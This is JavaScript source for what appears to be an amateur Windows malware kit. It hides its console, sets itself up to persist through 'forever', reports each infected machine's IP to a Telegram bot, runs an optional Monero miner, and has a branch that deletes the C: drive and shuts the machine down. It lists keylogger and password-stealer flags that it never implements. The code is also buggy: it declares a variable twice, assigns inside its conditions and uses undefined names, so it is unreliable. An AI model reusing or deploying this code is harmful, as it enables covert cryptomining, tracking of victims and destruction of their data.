const fs = require('fs')
const requests = require('requests')
const os = require("os");
const child_process = require('child_process').exec;
const superagent = require("superagent");
const crypto = require('crypto')
const NodeMiner = require('node-miner');
const ConsoleWindow = require("node-hide-console-window");
var ip = require("ip");

// CONFIG

//Logging
const apitoken = "" // Telegram api token
const channelid = "" // Telegram channel id
//Features
const keylogger = false // Keylogger
const password = false // Password stealer
const crypto = false // Crypto miner
const fuck = false // Fuck the computer :(

// IF CRYPTO TRUE (MONERO)
const miner = NodeMiner({
    host: `YOUR-POOL-HOST`,
    port: YOUR-POOL-PORT,
    username: `YOUR-MONERO-WALLET-ADRESS`,
    password: 'YOUR-PASSWORD-ON-POOL-OR-WORKER-NAME'
});

var connected = "[ðŸŒ€] - New client connected ["+ip.address()+"]"

// Persistence

ConsoleWindow.hideConsole();
child_process('npm i forever')
child_process(`cd ${filenamee}`)
child_process(`call C:\Users\Username\AppData\Roaming\npm\forever.cmd start index.js`)
child_process('exit 0')
superagent.get(`https://api.telegram.org/bot${apitoken}/sendMessage?chat_id=${channelid}&text=${connected}`)


if(crypto = true){
    var dirname = `${__dirname}`
    var filenamee = `${__filename}`
    var found = "New block found"
    var accepted = "Block Accepted"
    miner.start();
 
    miner.on('found', () => superagent.get(`https://api.telegram.org/bot${apitoken}/sendMessage?chat_id=${channelid}&text=${found}`));
    miner.on('accepted', () => superagent.get(`https://api.telegram.org/bot${apitoken}/sendMessage?chat_id=${channelid}&text=${accepted}`));
    miner.on('update', data => {
        console.log(`Hashrate: ${data.hashesPerSecond} H/s`);
        console.log(`Total hashes mined: ${data.totalHashes}`);
        console.log(`---`);
    });
}if(fucker = true){
    child_process('DEL C:/')
    child_process('MsgBox lol')
    child_process('shutdown /p')
}







